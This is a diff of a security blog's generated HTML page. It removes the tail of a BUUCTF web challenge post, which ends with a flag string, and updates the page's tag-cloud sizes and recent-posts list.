-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/64288a23-13c1-4116-8574-dba7738b1408" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6cb4bd76-2b5f-4876-9fe0-46f02e2d0062&#125;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/" data-id="cll80vdpg000030vfe67z1lar" data-title="Buuctf Web（21-24）" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1217,7 +1176,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 17.5px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 15px;">Web安全</a> <a href="/tags/learn/" style="font-size: 12.5px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 20px;">论文细读</a>
+      <a href="/tags/CTF/" style="font-size: 16.67px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 16.67px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">Web安全</a> <a href="/tags/learn/" style="font-size: 13.33px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 20px;">论文细读</a>
     </div>
   </div>
 
@@ -1239,6 +1198,10 @@
       <ul>
         
           <li>
+            <a href="/2024/02/18/20240218/">20240218</a>
+          </li>
+        
+          <li>
             <a href="/2024/02/16/Paper-SQIRL/">SQIRL__</a>
           </li>
         
@@ -1252,10 +1215,6 @@
         
           <li>
             <a href="/2024/02/08/Paper-IvySyn%20Automated%20Vulnerability%20Discovery%20in%20Deep%20Learning%20Frameworks/">IvySyn</a>
-          </li>
-        
-          <li>
-            <a href="/2024/02/07/Web-File2/">Web-File2</a>
           </li>
         
       </ul>
